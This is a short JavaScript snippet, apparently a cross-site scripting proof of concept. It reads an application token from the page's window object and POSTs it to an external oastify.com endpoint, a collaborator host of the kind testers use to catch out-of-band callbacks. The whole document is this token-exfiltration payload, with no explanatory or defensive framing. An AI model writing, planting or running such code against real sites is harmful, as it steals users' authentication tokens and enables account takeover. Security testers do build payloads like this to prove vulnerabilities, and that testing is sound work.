var apptoken = window.apptoken;

const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: JSON.stringify({ token: apptoken })
};
fetch('https://av9jxe7zmvmred17ljrqzi6u7ldc1ep3.oastify.com/test2', requestOptions)
    .then(response => response.json())
